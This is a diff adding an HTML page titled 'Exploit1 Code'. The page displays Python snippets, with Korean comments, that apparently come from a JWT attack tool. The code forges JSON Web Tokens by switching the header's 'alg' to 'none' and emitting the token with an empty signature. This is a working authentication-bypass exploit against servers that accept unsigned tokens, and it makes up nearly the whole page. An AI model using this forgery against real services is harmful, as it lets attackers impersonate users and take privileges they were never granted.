@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit1 Code</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;700&display=swap">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+    </script>
+    <style>
+        pre {
+            background-color: #f8f8f8;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Sans-serif', monospace; /* 폰트 변경 */
+            line-height: 1.6; /* 텍스트 간격 증가 */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Exploit1 Code</h2>
+
+        <pre><code class="python">
+token1 = autojwt.exploit1(mheader, mpayload)
+        </code></pre>
+
+        <pre><code class="python">
+def exploit1(header, payload):
+    # 문제; 객체 참조가 돼서 같은 객체를 가리키게 됨. ex_header = header
+    
+    ex_header = copy.deepcopy(header)
+    ex_header["alg"] = "none" #알고리즘 none으로 변경
+    modifiedToken = create_jwt(ex_header, payload) #변조한 토큰 생성
+    return modifiedToken
+        </code></pre>
+
+        <pre><code class="python">
+def create_jwt(header, payload):
+    algorithm = header.get('alg')
+
+    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
+    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
+    created_token = f"{encoded_header}.{encoded_payload}."
+    return created_token
+        </code></pre>
+    </div>
+</body>
+</html>
